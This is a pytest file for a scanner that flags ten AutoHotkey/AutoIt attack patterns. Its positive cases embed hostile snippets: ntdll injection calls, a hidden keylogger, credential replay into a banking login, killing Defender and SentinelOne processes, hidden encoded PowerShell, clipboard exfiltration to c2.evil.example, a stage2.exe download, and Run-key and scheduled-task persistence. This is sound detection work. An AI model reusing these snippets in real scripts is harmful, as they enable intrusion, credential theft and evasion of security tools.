"""Tests for scripts/lib/autohotkey_autoit_patterns.py.

Pattern-coverage tests for the Wave-33 distill-round-19 AutoHotkey/AutoIt
scripting-risk catalogue (10 AHK/AutoIt attack patterns). Each rule has 2
tests: one positive (canary should fire) and one negative (clean code must
not fire).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))  # noqa: E402

import autohotkey_autoit_patterns as ahk  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_all_ten_rule_ids() -> None:
    """RULES must cover all 10 documented rule IDs with aha- prefix."""
    assert isinstance(ahk.RULES, tuple)
    rule_ids = {r.id for r in ahk.RULES}
    expected = {
        "aha-dllcall-ntdll-syscall",
        "aha-guicontrol-hidden-keylogger",
        "aha-send-raw-credentials",
        "aha-fileinstall-payload-dropper",
        "aha-processclose-edr-evasion",
        "aha-com-objcreate-excel-macro",
        "aha-run-shellexecute-controlled-path",
        "aha-dllcall-loadlibrary-manual-api",
        "aha-winhttp-exfil-c2",
        "aha-persistence-schtask-regwrite",
    }
    assert expected == rule_ids
    assert len(ahk.RULES) == 10


def test_every_rule_has_valid_severity_and_owasp() -> None:
    """Every rule maps to a known severity and an ASI- prefixed OWASP entry."""
    for rule in ahk.RULES:
        assert rule.severity in {"CRITICAL", "MAJOR", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert "ASI-" in rule.owasp_asi, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors webhook_signature_patterns.Finding shape."""
    f = ahk.Finding(
        rule_id="aha-test",
        line=1,
        column=2,
        matched_text="m",
        severity="CRITICAL",
        description="d",
        owasp_asi="ASI-05",
    )
    assert f.rule_id == "aha-test"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "CRITICAL"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-05"


def test_empty_text_returns_empty_findings() -> None:
    """Empty input must short-circuit to []."""
    assert ahk.scan_text("") == []


# ---------- AAR-01 : DllCall ntdll direct syscall ------------------------


def test_aar01_dllcall_ntdll_literal_fires() -> None:
    """DllCall with ntdll\\ prefix string literal must trigger aha-dllcall-ntdll-syscall."""
    src = (
        'hProc := DllCall("OpenProcess", "UInt", 0x1F0FFF, "Int", 0, "UInt", pid, "Ptr")\n'
        'addr  := DllCall("ntdll\\NtAllocateVirtualMemory", "Ptr", hProc, "Ptr*", 0, "UInt*", 0, "UInt*", sz, "UInt", 0x3000, "UInt", 0x40, "Int")\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-dllcall-ntdll-syscall" in rule_ids


def test_aar01_clean_dllcall_no_ntdll_no_fire() -> None:
    """DllCall to kernel32 without ntdll must not trigger aha-dllcall-ntdll-syscall."""
    src = 'result := DllCall("kernel32\\CreateFile", "Str", path, "UInt", 0x80000000, "Int")\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-dllcall-ntdll-syscall"]
    assert findings == []


def test_aar01_ntdll_func_name_fires() -> None:
    """DllCall with NtCreateThreadEx function name must trigger aha-dllcall-ntdll-syscall."""
    src = 'DllCall(pfnNtCreateThreadEx, "Ptr*", 0, "UInt", 0x1FFFFF, "Ptr", 0, "Ptr", hProc, "Ptr", addr, "Ptr", 0, "Int", 0)\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-dllcall-ntdll-syscall" in rule_ids


# ---------- AAR-02 : GuiControl hidden keylogger -------------------------


def test_aar02_gui_hidden_show_fires() -> None:
    """Gui, Show with Hide keyword must trigger aha-guicontrol-hidden-keylogger."""
    src = "Gui, +LastFound +AlwaysOnTop -Caption +ToolWindow\nGui, Show, w1 h1, Hide\n"
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-guicontrol-hidden-keylogger" in rule_ids


def test_aar02_visible_gui_no_fire() -> None:
    """Gui, Show without Hide/Transparent must not trigger aha-guicontrol-hidden-keylogger."""
    src = "Gui, Show, w400 h300, My Application\nGui, Add, Button, Default, OK\n"
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-guicontrol-hidden-keylogger"]
    assert findings == []


def test_aar02_input_with_v_flag_fires() -> None:
    """Input command with V flag must trigger aha-guicontrol-hidden-keylogger."""
    src = "Input, KeysTyped, V T30, {Enter}\nFileAppend, %KeysTyped%`n, C:\\log.txt\n"
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-guicontrol-hidden-keylogger" in rule_ids


# ---------- AAR-03 : Send raw / credential replay ------------------------


def test_aar03_controlsend_variable_fires() -> None:
    """ControlSend with captured variable into named window must trigger aha-send-raw-credentials."""
    src = (
        'WinWaitActive("Online Banking - Sign In")\n'
        'ControlSend("Online Banking - Sign In", "", "Edit1", $captured_username)\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-send-raw-credentials" in rule_ids


def test_aar03_static_send_no_fire() -> None:
    """Send with static literal string must not trigger aha-send-raw-credentials."""
    src = 'Send, Hello World{Enter}\nMsgBox, Done\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-send-raw-credentials"]
    assert findings == []


def test_aar03_winwaitactive_sendraw_var_fires() -> None:
    """WinWaitActive followed by SendRaw with variable must trigger aha-send-raw-credentials."""
    src = (
        "WinWaitActive(\"Login Page\", \"\", 30)\n"
        "SendRaw, %captured_password%\n"
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-send-raw-credentials" in rule_ids


# ---------- AAR-04 : FileInstall payload dropper -------------------------


def test_aar04_fileinstall_exe_fires() -> None:
    """FileInstall with .exe extension must trigger aha-fileinstall-payload-dropper."""
    src = 'FileInstall("payload.dll", @TempDir & "\\svchost.dll", 1)\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-fileinstall-payload-dropper" in rule_ids


def test_aar04_fileinstall_data_file_no_fire() -> None:
    """FileInstall with .ini data file must not trigger aha-fileinstall-payload-dropper."""
    src = 'FileInstall("config.ini", @ScriptDir & "\\config.ini", 1)\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-fileinstall-payload-dropper"]
    assert findings == []


def test_aar04_fileinstall_tempdir_fires() -> None:
    """FileInstall dropping to @AppDataDir must trigger aha-fileinstall-payload-dropper."""
    src = 'FileInstall("stage2.exe", @AppDataDir & "\\MicrosoftEdge\\msedge.exe", 1)\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-fileinstall-payload-dropper" in rule_ids


# ---------- AAR-05 : ProcessClose AV/EDR evasion -------------------------


def test_aar05_processclose_msmpeng_fires() -> None:
    """ProcessClose targeting MsMpEng.exe must trigger aha-processclose-edr-evasion."""
    src = 'If ProcessExists("MsMpEng.exe") Then\n    ProcessClose("MsMpEng.exe")\nEndIf\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-processclose-edr-evasion" in rule_ids


def test_aar05_processclose_notepad_no_fire() -> None:
    """ProcessClose targeting notepad.exe must not trigger aha-processclose-edr-evasion."""
    src = 'If ProcessExists("notepad.exe") Then\n    ProcessClose("notepad.exe")\nEndIf\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-processclose-edr-evasion"]
    assert findings == []


def test_aar05_ahk_process_close_sentinel_fires() -> None:
    """AHK Process, Close targeting SentinelAgent must trigger aha-processclose-edr-evasion."""
    src = "Process, Close, SentinelAgent\nMsgBox, AV killed\n"
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-processclose-edr-evasion" in rule_ids


# ---------- AAR-06 : COM ObjCreate Excel macro ---------------------------


def test_aar06_objcreate_excel_fires() -> None:
    """ObjCreate('Excel.Application') must trigger aha-com-objcreate-excel-macro."""
    src = (
        'Local $oExcel = ObjCreate("Excel.Application")\n'
        "$oExcel.Visible = False\n"
        'Local $oWB = $oExcel.Workbooks.Open(@TempDir & "\\update.xlsm")\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-com-objcreate-excel-macro" in rule_ids


def test_aar06_objcreate_adodb_no_fire() -> None:
    """ObjCreate with ADODB (not in the COM list) must not trigger aha-com-objcreate-excel-macro."""
    src = 'Local $oConn = ObjCreate("ADODB.Connection")\n$oConn.Open($sConnString)\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-com-objcreate-excel-macro"]
    assert findings == []


def test_aar06_ahk_comobjcreate_wscript_fires() -> None:
    """AHK ComObjCreate('WScript.Shell') must trigger aha-com-objcreate-excel-macro."""
    src = 'shell := ComObjCreate("WScript.Shell")\nshell.Run("cmd.exe /c whoami")\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-com-objcreate-excel-macro" in rule_ids


# ---------- AAR-07 : Run / ShellExecute controlled path ------------------


def test_aar07_run_variable_hide_fires() -> None:
    """AHK Run with %%variable%% path and Hide flag must trigger aha-run-shellexecute-controlled-path."""
    src = (
        "IniRead, payload_path, config.ini, Paths, Loader\n"
        "Run, %payload_path%, , Hide\n"
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-run-shellexecute-controlled-path" in rule_ids


def test_aar07_run_static_no_hide_no_fire() -> None:
    """Run with static literal and no Hide flag must not trigger aha-run-shellexecute-controlled-path."""
    src = 'Run, notepad.exe\nWinWaitActive, Untitled\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-run-shellexecute-controlled-path"]
    assert findings == []


def test_aar07_run_powershell_b64_fires() -> None:
    """Run launching PowerShell with -EncodedCommand must trigger aha-run-shellexecute-controlled-path."""
    src = "Run, %ComSpec% /c powershell.exe -WindowStyle Hidden -EncodedCommand %b64payload%, , Hide\n"
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-run-shellexecute-controlled-path" in rule_ids


# ---------- AAR-08 : DllCall LoadLibrary manual API ----------------------


def test_aar08_loadlibrary_fires() -> None:
    """DllCall('LoadLibraryA') must trigger aha-dllcall-loadlibrary-manual-api."""
    src = (
        'hLib := DllCall("LoadLibraryA", "AStr", "C:\\Users\\Public\\payload.dll", "Ptr")\n'
        'pfn  := DllCall("GetProcAddress", "Ptr", hLib, "AStr", "Init", "Ptr")\n'
        "DllCall(pfn, \"Ptr\", 0, \"Int\")\n"
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-dllcall-loadlibrary-manual-api" in rule_ids


def test_aar08_clean_dllcall_no_fire() -> None:
    """DllCall to regular API without LoadLibrary/GetProcAddress must not trigger aha-dllcall-loadlibrary-manual-api."""
    src = 'result := DllCall("user32\\MessageBox", "Ptr", 0, "Str", "Hello", "Str", "Test", "UInt", 0)\n'
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-dllcall-loadlibrary-manual-api"]
    assert findings == []


def test_aar08_getprocaddress_fires() -> None:
    """DllCall('GetProcAddress') must trigger aha-dllcall-loadlibrary-manual-api."""
    src = 'pfVirtualAlloc := DllCall("GetProcAddress", "Ptr", hKernel32, "AStr", "VirtualAlloc", "Ptr")\n'
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-dllcall-loadlibrary-manual-api" in rule_ids


# ---------- AAR-09 : WinHttp C2 / exfil ----------------------------------


def test_aar09_objcreate_winhttp_fires() -> None:
    """ObjCreate('WinHttp.WinHttpRequest.5.1') must trigger aha-winhttp-exfil-c2."""
    src = (
        'Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")\n'
        '$oHTTP.Open("POST", "https://c2.evil.example/log", False)\n'
        '$oHTTP.Send("data=" & ClipGet())\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-winhttp-exfil-c2" in rule_ids


def test_aar09_no_winhttp_no_fire() -> None:
    """Code without WinHttp/COM network object must not trigger aha-winhttp-exfil-c2."""
    src = "IniRead, host, config.ini, Server, Host\nMsgBox, %host%\n"
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-winhttp-exfil-c2"]
    assert findings == []


def test_aar09_ahk_comobjcreate_winhttp_fires() -> None:
    """AHK ComObjCreate('WinHttp.WinHttpRequest.5.1') must trigger aha-winhttp-exfil-c2."""
    src = (
        'http := ComObjCreate("WinHttp.WinHttpRequest.5.1")\n'
        'http.Open("GET", "http://185.220.1.1/stage2.exe", false)\n'
        "http.Send()\n"
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-winhttp-exfil-c2" in rule_ids


# ---------- AAR-10 : RegWrite / schtasks persistence ---------------------


def test_aar10_ahk_regwrite_run_key_fires() -> None:
    """AHK RegWrite to CurrentVersion\\Run must trigger aha-persistence-schtask-regwrite."""
    src = (
        "RegWrite, REG_SZ, HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,"
        " WindowsUpdate, %A_ScriptFullPath%\n"
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-persistence-schtask-regwrite" in rule_ids


def test_aar10_regwrite_other_key_no_fire() -> None:
    """RegWrite to an unrelated key must not trigger aha-persistence-schtask-regwrite."""
    src = (
        'RegWrite, REG_SZ, HKCU\\SOFTWARE\\MyApp\\Settings, Theme, Dark\n'
    )
    findings = [f for f in ahk.scan_text(src) if f.rule_id == "aha-persistence-schtask-regwrite"]
    assert findings == []


def test_aar10_autoit_regwrite_run_key_fires() -> None:
    """AutoIt RegWrite to HKEY_CURRENT_USER CurrentVersion\\Run must trigger aha-persistence-schtask-regwrite."""
    src = (
        'RegWrite("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",\n'
        '         "WindowsUpdate", "REG_SZ", @ScriptFullPath)\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-persistence-schtask-regwrite" in rule_ids


def test_aar10_schtasks_create_fires() -> None:
    """Run invoking schtasks /create must trigger aha-persistence-schtask-regwrite."""
    src = (
        'Run("schtasks /create /tn \\"WindowsUpdate\\" /tr \\"" & @ScriptFullPath & "\\" /sc ONLOGON /f", "", @SW_HIDE)\n'
    )
    findings = ahk.scan_text(src)
    rule_ids = {f.rule_id for f in findings}
    assert "aha-persistence-schtask-regwrite" in rule_ids
